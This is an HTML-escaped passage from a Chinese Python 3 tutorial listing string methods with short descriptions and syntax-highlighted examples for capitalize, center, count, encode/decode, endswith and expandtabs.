&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-center.html&#34;&gt;center(width, fillchar)&lt;/a&gt; 返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-count.html&#34;&gt;count(str, beg= 0,end=len(string))&lt;/a&gt; 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-decode.html&#34;&gt;bytes.decode(encoding=”utf-8”, errors=”strict”)&lt;/a&gt; Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-encode.html&#34;&gt;encode(encoding=’UTF-8’,errors=’strict’)&lt;/a&gt; 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-endswith.html&#34;&gt;endswith(suffix, beg=0, end=len(string))&lt;/a&gt; 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-expandtabs.html&#34;&gt;expandtabs(tabsize=8)&lt;/a&gt; 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-find.html&#34;&gt;find(str, beg=0, end=len(string))&lt;/a&gt; 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-index.html&#34;&gt;index(str, beg=0, end=len(string))&lt;/a&gt; 跟find()方法一样，只不过如果str不在字符串中会报一个异常。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isalnum.html&#34;&gt;isalnum()&lt;/a&gt; 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isalpha.html&#34;&gt;isalpha()&lt;/a&gt; 如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isdigit.html&#34;&gt;isdigit()&lt;/a&gt; 如果字符串只包含数字则返回 True 否则返回 False..&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;13&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-islower.html&#34;&gt;islower()&lt;/a&gt; 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;14&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isnumeric.html&#34;&gt;isnumeric()&lt;/a&gt; 如果字符串中只包含数字字符，则返回 True，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;15&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isspace.html&#34;&gt;isspace()&lt;/a&gt; 如果字符串中只包含空白，则返回 True，否则返回 False.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;16&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-istitle.html&#34;&gt;istitle()&lt;/a&gt; 如果字符串是标题化的(见 title())则返回 True，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;17&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isupper.html&#34;&gt;isupper()&lt;/a&gt; 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;18&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-join.html&#34;&gt;join(seq)&lt;/a&gt; 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;19&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-len.html&#34;&gt;len(string)&lt;/a&gt; 返回字符串长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;20&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[ljust(width&lt;a href=&#34;https://www.runoob.com/python3/python3-string-ljust.html&#34;&gt;, fillchar])&lt;/a&gt; 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;21&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-lower.html&#34;&gt;lower()&lt;/a&gt; 转换字符串中所有大写字符为小写.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;22&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-lstrip.html&#34;&gt;lstrip()&lt;/a&gt; 截掉字符串左边的空格或指定字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;23&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-maketrans.html&#34;&gt;maketrans()&lt;/a&gt; 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;24&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-max.html&#34;&gt;max(str)&lt;/a&gt; 返回字符串 str 中最大的字母。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;25&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-min.html&#34;&gt;min(str)&lt;/a&gt; 返回字符串 str 中最小的字母。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;26&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[replace(old, new &lt;a href=&#34;https://www.runoob.com/python3/python3-string-replace.html&#34;&gt;, max])&lt;/a&gt; 把 将字符串中的 old 替换成 new,如果 max 指定，则替换不超过 max 次。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;27&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-rfind.html&#34;&gt;rfind(str, beg=0,end=len(string))&lt;/a&gt; 类似于 find()函数，不过是从右边开始查找.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;28&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-rindex.html&#34;&gt;rindex( str, beg=0, end=len(string))&lt;/a&gt; 类似于 index()，不过是从右边开始.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;29&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[rjust(width,&lt;a href=&#34;https://www.runoob.com/python3/python3-string-rjust.html&#34;&gt;, fillchar])&lt;/a&gt; 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;30&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-rstrip.html&#34;&gt;rstrip()&lt;/a&gt; 删除字符串末尾的空格或指定字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;31&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-split.html&#34;&gt;split(str=””, num=string.count(str))&lt;/a&gt; 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;32&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[splitlines(&lt;a href=&#34;https://www.runoob.com/python3/python3-string-splitlines.html&#34;&gt;keepends])&lt;/a&gt; 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;33&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-startswith.html&#34;&gt;startswith(substr, beg=0,end=len(string))&lt;/a&gt; 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;34&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[strip(&lt;a href=&#34;https://www.runoob.com/python3/python3-string-strip.html&#34;&gt;chars])&lt;/a&gt; 在字符串上执行 lstrip()和 rstrip()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;35&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-swapcase.html&#34;&gt;swapcase()&lt;/a&gt; 将字符串中大写转换为小写，小写转换为大写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;36&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-title.html&#34;&gt;title()&lt;/a&gt; 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;37&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-translate.html&#34;&gt;translate(table, deletechars=””)&lt;/a&gt; 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;38&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-upper.html&#34;&gt;upper()&lt;/a&gt; 转换字符串中的小写字母为大写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;39&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-zfill.html&#34;&gt;zfill (width)&lt;/a&gt; 返回长度为 width 的字符串，原字符串右对齐，前面填充0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;40&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-isdecimal.html&#34;&gt;isdecimal()&lt;/a&gt; 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;函数示例-1&#34;&gt;&lt;a href=&#34;#函数示例-1&#34; class=&#34;headerlink&#34; title=&#34;函数示例&#34;&gt;&lt;/a&gt;函数示例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example from runoob....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.capitalize() : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;capitalize&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.capitalize() :  This is string example from runoob....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;[runoob]&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.center(40, &#39;*&#39;) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;center&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.center(40, &#39;*&#39;) :  ****************[runoob]****************&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;www.runoob.com&#34;&lt;/span&gt;
sub &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;o&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.count(&#39;o&#39;) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sub&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.count(&#39;o&#39;) :  3&lt;/span&gt;

sub &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;run&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.count(&#39;run&#39;, 0, 10) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sub&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.count(&#39;run&#39;, 0, 10) :  1&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;菜鸟教程&#34;&lt;/span&gt;
str_utf8 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;UTF-8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
str_gbk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;GBK&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 菜鸟教程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;UTF-8 编码：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; str_utf8&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# UTF-8 编码： b&#39;\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;GBK 编码：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; str_gbk&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# GBK 编码： b&#39;\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;UTF-8 解码：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; str_utf8&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;UTF-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;strict&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# UTF-8 解码： 菜鸟教程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;GBK 解码：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; str_gbk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GBK&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;strict&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# GBK 解码： 菜鸟教程&lt;/span&gt;

Str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob example....wow!!!&#39;&lt;/span&gt;
suffix &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;!!&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;endswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;suffix&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;endswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;suffix&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;
suffix &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;run&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;endswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;suffix&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;endswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;suffix&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob\t12345\tabc&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;原始字符串:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 原始字符串: runoob	12345	abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 默认 8 个空格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# runnob 有 6 个字符，后面的 \t 填充 2 个空格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 12345 有 5 个字符，后面的 \t 填充 3 个空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;替换 \\t 符号:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 替换 \t 符号: runoob  12345   abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 2 个空格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# runnob 有 6 个字符，刚好是 2 的 3 倍，后面的 \t 填充 2 个空格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 12345 有 5 个字符，不是 2 的倍数，后面的 \t 填充 1 个空格&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;使用 2 个空格替换 \\t 符号:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;expandtabs&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 使用 2 个空格替换 \t 符号: runoob  12345 abc&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 3 个空格&lt;/span&gt;
